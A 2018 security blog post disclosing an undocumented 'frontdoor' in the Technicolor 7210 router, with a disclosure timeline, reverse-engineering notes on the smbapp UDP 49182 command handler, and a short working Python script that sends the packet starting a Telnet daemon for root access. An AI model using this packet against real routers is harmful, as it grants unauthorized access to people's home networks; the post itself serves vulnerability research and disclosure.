+++
banner = "/uploads/2018/10/technicolor-frontdoor.png"
categories = [ "Exploit", "Linux", "Hardware Hacking", "Reverse Engineering" ]
date = "2018-10-23T00:40:00+00:00"
excerpt = "How to use hidden functionality in the Technicolor 7210 to gain root access to it..."
format = "post"
tags = [ "Technicolor", "Passwords", "SOHO", "QEMU" ]
title = "Frontdoor to the Technicolor 7210"

[[timeline]]
id = "disclosure"
title = "Disclosure Timeline"

[[disclosure]]
id = "F"
title = "30 days"
start = "2018-06-24"
end = "2018-07-24"
type = "background"
className = "bg-first text-dark"

[[disclosure]]
id = "S"
title = "60 days"
start = "2018-07-24"
end = "2018-08-24"
type = "background"
className = "bg-second text-dark"

[[disclosure]]
id = "T"
title = "90 days"
start = "2018-08-24"
end = "2018-09-24"
type = "background"
className = "bg-third text-dark"

[[disclosure]]
id = 1
title = "First reported issues to Technicolor"
start = "2018-06-24"

[[disclosure]]
id = 2
title = "Report acknowledged"
content = "Technicolor’s security team acknowledged receipt of the report"
start = "2018-06-24"

[[disclosure]]
id = 3
title = "Asked for an update"
start = "2018-07-10"

[[disclosure]]
id = 4
title = "Asked for an update"
start = "2018-09-06"

[[disclosure]]
id = 5
title = "Vulnerability acknowledged"
content = "Technicolor’s security theme acknowledged the vulnerability and let me know that they’re in the process of fixing it"
start = "2018-09-07"

[[disclosure]]
id = 6
title = "Continue to withhold disclosure"
content = "Informed Technicolor’s security team that I will continue to withhold disclosure and suggested a possible fix for this flaw and for a newly discovered way to exploit a previously reported RCE"
start = "2018-09-07"

[[disclosure]]
id = 7
title = "Asked for an update"
content = "Let Technicolor team know I had published the post on how I reversed engineer the firmware, asked if a CVE had been assigned and reminded that the 90 [sic] day grace period will end on October 24th"
start = "2018-10-08"

[[disclosure]]
id = 8
title = "Public release"
content = "Released details through this blog post (120 days after reporting it)"
start = "2018-10-24"
+++

In a previous [article][1], I explained how to get `root` on the embedded Linux part of the Technicolor 7210 router by leveraging a remote code execution (RCE). This article on the other hand, will explain how one can leverage a "frontdoor" to gain the same level of access.

<!--more-->

{{< youtube class="ratio ratio-16x9 mb-3" id="zPmzcbA--A8" >}}

{{< alert >}}This blog post was originally written in 23 of June, 2018. The vulnerability disclosed in this blog post, as far as I know is yet to be fixed. I haven't requested a CVE, neither am I aware if Technicolor did so. Disclosure timeline can be found at the end of the blog post.{{< /alert >}}

### Control Mechanism

The TC7210 has two operative systems (OS), the eCos real-time OS, and a Linux based embedded OS. The eCos OS is responsible for managing all network functionalities as well as the Network Attached Storage (NAS) functionalities provided by the Linux OS.

For that to happen, the eCos OS needs to be able to communicate with the Linux OS. As discussed in the previous article, the `smbapp` is the application responsible for managing the NAS functionality. A good indicator of how the application is receiving commands from the eCos OS is the fact that it listens on port `49182` (UDP).

```shell {linenos=inline}
#!/bin/bash
netstat -nlp
# Active Internet connections (only servers)
# Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
# tcp        0      0 192.168.178.10:4321     0.0.0.0:*               LISTEN      556/bcmmserver
# tcp        0      0 192.168.178.10:2468     0.0.0.0:*               LISTEN      556/bcmmserver
# tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      2601/smbd
# tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      316/portmap
# tcp        0      0 192.168.178.10:80       0.0.0.0:*               LISTEN      556/bcmmserver
# tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      2601/smbd
# tcp        0      0 :::23                   :::*                    LISTEN      2596/telnetd
# udp        0      0 192.168.178.10:137      0.0.0.0:*                           2649/nmbd
# udp        0      0 0.0.0.0:137             0.0.0.0:*                           2649/nmbd
# udp        0      0 192.168.178.10:138      0.0.0.0:*                           2649/nmbd
# udp        0      0 0.0.0.0:138             0.0.0.0:*                           2649/nmbd
# udp        0      0 0.0.0.0:49181           0.0.0.0:*                           386/mscapp
# udp        0      0 0.0.0.0:49182           0.0.0.0:*                           328/smbapp
# udp        0      0 0.0.0.0:1900            0.0.0.0:*                           556/bcmmserver
# udp        0      0 0.0.0.0:111             0.0.0.0:*                           316/portmap
# Active UNIX domain sockets (only servers)
# Proto RefCnt Flags       Type       State         I-Node PID/Program name    Path
```

By revisiting the string analysis performed previously it was possible to find other interesting strings in the `smbapp` application that indicated some sort of functionality to manage a Telnet server. The strings are: `smbapp: Launching telnetd.` and `smbapp: Killing telnetd`. It is possible to confirm this by loading `smbapp` in a disassembler and searching for references to those strings.

{{< figure image="/uploads/2018/10/tc7210-telnet-control.png" alternative="Telnetd control" caption="Starting and stopping the Telnet daemon."  thumbnail="/uploads/2018/10/tc7210-telnet-control-800x247.png">}}

The code above is contained in a function called `executeCommand` which is called from a loop where the UDP packets to port `49182` are received.

{{< figure image="/uploads/2018/10/tc7210-recfrom-loop.png" alternative="Receiving the UDP packets." caption="Receiving the UDP packets."  thumbnail="/uploads/2018/10/tc7210-recfrom-loop-800x368.png">}}

### Flow and Packets

The next step is to understand what is the format of the packet that needs to be sent to the `smbapp` in order to start the Telnet daemon. The `executeCommand` function is quite complex and has an awful amount of branching. As such it is easier to backtrack the flow of code execution taking into consideration all the branching that would lead to the Telnet daemon being launched.

{{< figure image="/uploads/2018/10/tc7210-executecommand-flow.png" alternative="Flow of execution needed to control the Telnet daemon." caption="Flow of execution needed to control the Telnet daemon."  thumbnail="/uploads/2018/10/tc7210-executecommand-flow-800x1129.png">}}

From the flow of execution depicted above, we can see that the first word of the packet that needs to be sent is `0x107`, the following word doesn't really matter, and the last double word should be `0x00000001`.

### Exploitation

With this information, the next step was to hack up a script that would send the right bytes to the listening socket of the `smbapp`.

```python {linenos=inline}
import socket

ADDRESS = '<IP address of the NAS>'
PORT = 49182
PACKET = bytes([
    0x01, 0x07, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x01
])

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(PACKET, (ADDRESS, PORT))

line, server = sock.recvfrom(128)

print(line)
```

{{< alert >}}The script needs to be executed with Python 3.{{< /alert >}}

Using the script against the NAS functionality of the router, we get an awesome Telnet prompt. Further to the above, it is also possible to control an HTTP server (that exposes some CGI scripts), and whether the Linux OS responds to pings.

{{< figure image="/uploads/2018/10/tc7210-exploit.png" alternative="Success!" caption="Outcomes of the execution of the script.">}}

Hope this has been interesting and insightful!

[1]: /2018/06/03/rooting-the-technicolor-7210/ "Rooting the Technicolor 7210"
